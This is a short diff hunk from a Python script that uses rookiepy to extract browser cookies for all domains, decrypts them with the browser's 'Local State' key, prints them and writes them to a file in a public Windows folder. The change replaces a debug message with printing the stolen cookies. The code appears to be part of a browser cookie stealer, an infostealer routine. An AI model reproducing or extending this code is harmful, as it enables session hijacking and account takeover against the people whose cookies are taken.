@@ -52,7 +52,7 @@ def main():
         key_path = Path(BASE_DIR) / "Local State"
         print("coo")
         cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
-        print("cook")
+        print(cookies)
         output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
         print("cooki")
         with open(output_file, "w") as file:
